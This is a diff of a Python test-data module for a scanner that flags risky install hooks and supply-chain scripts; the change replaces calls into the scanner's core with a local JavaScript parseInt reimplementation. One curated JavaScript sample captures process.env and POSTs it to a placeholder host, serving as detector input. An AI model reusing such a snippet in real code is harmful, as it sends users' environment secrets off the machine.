@@ -1,9 +1,9 @@
-"""The hooks parity corpus: the inputs the parity tests of the install-hook
-and supply-chain functions read — the Rust engine's against core
-(test_rust_parity_hooks.py and _hooks_b.py, test_rust_parity_signs.py) and
-its WebAssembly build against its platform library (test_wasm_parity*.py) —
-and core's answers for one case (core_view), field by field (FIELDS). Not a
-test: a plain module of shared data.
+"""The hooks corpus: the inputs the tests of the install-hook and
+supply-chain functions read — the engine held to its recorded outputs
+(test_snapshot_hooks.py, test_snapshot_signs.py) and its WebAssembly build
+to its platform library (test_wasm_parity*.py). FIELDS names what the
+engine's hooks_view answers for one case. Not a test: a plain module of
+shared data.
 
 Realistic hook commands and install / import-time scripts (CURATED and the
 *_CURATED lists), then a seeded random stream of cases built from pieces
@@ -11,11 +11,10 @@ each mechanism looks at (MIXED, QUOTING, CD, …): see corpus().
 """
 import base64
 import json
+import math
 import os
 import random
 import re
-
-from lazaret.scanner import core
 
 FIELDS = ("shlex tokens", "_hook_tokens", "follow_hook", "install_script_risk", "import_time_risk",
           "node_candidates", "_NODE_E_RE codes", "shebang_lang", "import_time_risk py", "import_time_risk js",
@@ -908,7 +907,7 @@ FLOW_CURATED = [
     'const orig = window.fetch;\nwindow.fetch = async function (...a) { const t0 = Date.now(); const r = await orig(...a);\n  report(Date.now() - t0); return r; };\n',
     # 0.1.8's last round: a receiver's member is followed, not the receiver; keywords name nothing; an
     # object literal's methods and a callback given a call are code (a long text, where a name is followed
-    # only near where it was given the data: test_rust_parity_signs' LongTextFlowParityTests)
+    # only near where it was given the data: test_snapshot_signs' long texts)
     "class C {\n  constructor() { this.env = process.env; }\n"
     "  send() { fetch('https://x.invalid/', {method: 'POST', body: JSON.stringify(this.env)}); }\n}\n",
     "class C {\n  constructor() { this.env = process.env; }\n"
@@ -1376,12 +1375,11 @@ def strarr_case(rnd):
     numbered = [i for i, s in enumerate(strings) if s[:1].isdigit()]
     chosen = numbered[:terms]
     expr, value = "", 0.0
-    from lazaret.scanner import core as _core
     for k, i in enumerate(chosen):
         div = rnd.randint(1, 12)
         sign = rnd.choice(["", "-"])
         term = sign + "parseInt(" + call(i) + ")/" + hex(div)
-        v = (-1 if sign else 1) * _core._sa_parse_int(strings[i]) / div
+        v = (-1 if sign else 1) * _js_parse_int(strings[i]) / div
         if k and rnd.random() < 0.4:
             mul = rnd.randint(1, 9)
             term = "(" + term + ")*" + hex(mul)
@@ -1614,17 +1612,29 @@ def sharded():
     return bool(os.environ.get("LAZARET_PARITY_SHARD", ""))
 
 
-def shlex_tokens(cmd):
-    """_hook_tokens' shlex reading of cmd, or None where shlex raises (core's
-    own, which keeps the last command's tokens for the calls after it)."""
-    return core._hook_shlex(cmd)
+_JS_SPACE = frozenset("\t\n\v\f\r \u00a0\u1680\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009"
+                      "\u200a\u2028\u2029\u202f\u205f\u3000\ufeff")
+_HEX = frozenset("0123456789abcdefABCDEF")
 
 
-def core_view(text):
-    """core's answers for one case, in FIELDS order (as JSON would carry them)."""
-    return [shlex_tokens(text), core._hook_tokens(text), list(core.follow_hook(text)),
-            core.install_script_risk(text), list(core.import_time_risk(text)), core.node_candidates(text),
-            [next(g for g in m.groups() if g is not None) for m in core._NODE_E_RE.finditer(text)],
-            core.shebang_lang(text), list(core.import_time_risk(text, "py")), list(core.import_time_risk(text, "js")),
-            core.self_publish_at(text), core.runs_dll(text), core.join_string_pieces(text), core.decoded_view(text),
-            [list(t) for t in core.spawned_scripts(text)]]
+def _js_parse_int(v):
+    """JavaScript's parseInt(v) for a string (radix 10, or 16 after 0x), NaN
+    for anything else and past 15 decimal (13 hex) digits: the value the
+    engine's string-array reader computes, so a generated checksum loop
+    stops where the reader expects it to."""
+    i, n = 0, len(v)
+    while i < n and v[i] in _JS_SPACE:
+        i += 1
+    sign = 1.0
+    if i < n and v[i] in "+-":
+        sign = -1.0 if v[i] == "-" else 1.0
+        i += 1
+    radix = 10
+    if v[i:i + 2] in ("0x", "0X"):
+        radix, i = 16, i + 2
+    j = i
+    while j < n and ("0" <= v[j] <= "9" or radix == 16 and v[j] in _HEX):
+        j += 1
+    if j == i or j - i > (13 if radix == 16 else 15):
+        return math.nan
+    return sign * float(int(v[i:j], radix))
